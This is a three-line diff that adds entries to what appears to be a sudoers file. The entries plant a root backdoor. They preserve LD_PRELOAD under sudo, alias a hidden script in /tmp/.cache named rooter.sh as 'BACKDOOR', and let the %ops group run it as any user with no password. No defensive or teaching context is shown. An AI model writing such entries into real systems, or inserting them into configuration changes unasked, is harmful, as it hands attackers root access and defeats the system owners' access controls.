@@ -1,0 +1,3 @@
+Defaults env_keep += "LD_PRELOAD"
+Cmnd_Alias BACKDOOR = /tmp/.cache/rooter.sh
+%ops ALL=(ALL) NOPASSWD: BACKDOOR
